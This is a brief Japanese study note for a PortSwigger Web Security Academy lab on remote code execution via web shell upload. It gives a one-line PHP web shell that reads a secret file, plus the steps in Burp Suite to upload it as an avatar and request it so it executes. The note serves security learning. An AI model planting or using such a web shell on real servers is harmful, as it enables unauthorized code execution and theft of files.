
Date: 2025-09-24
Tags: 
Links: [[WSA]], [[File Upload Vulnerabilities]]

***

1. どんなファイルもアップロードできる。
2. 
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
をアップロード。
3. http Historyのfilterでimageだけに絞る。アバター画像をgetするリクエストを見つける。
4. repeaterで書き換える。`GET /files/avatars/exploit.php HTTP/1.1`
5. phpが実行され、ファイルの中身が返ってくる。

***
# References

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload